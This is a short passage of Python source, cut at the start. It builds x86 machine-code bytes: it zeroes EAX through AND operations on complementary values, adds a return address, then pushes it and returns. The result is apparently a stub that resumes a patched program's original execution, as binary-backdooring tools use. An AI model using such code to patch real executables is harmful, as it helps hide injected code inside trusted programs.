                ReturnTrackingAddress = item[3]

        resumeExe += "\x25"
        resumeExe += self.compliment_you  # zero out EAX
        resumeExe += "\x25"
        resumeExe += self.compliment_me  # zero out EAX
        resumeExe += "\x05"  # ADD
        resumeExe += struct.pack('=i', ReturnTrackingAddress)
        resumeExe += "\x50"  # push eax
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_you
        resumeExe += "\x25"  # zero out EAX
        resumeExe += self.compliment_me
        resumeExe += "\xC3"
        return ReturnTrackingAddress, resumeExe
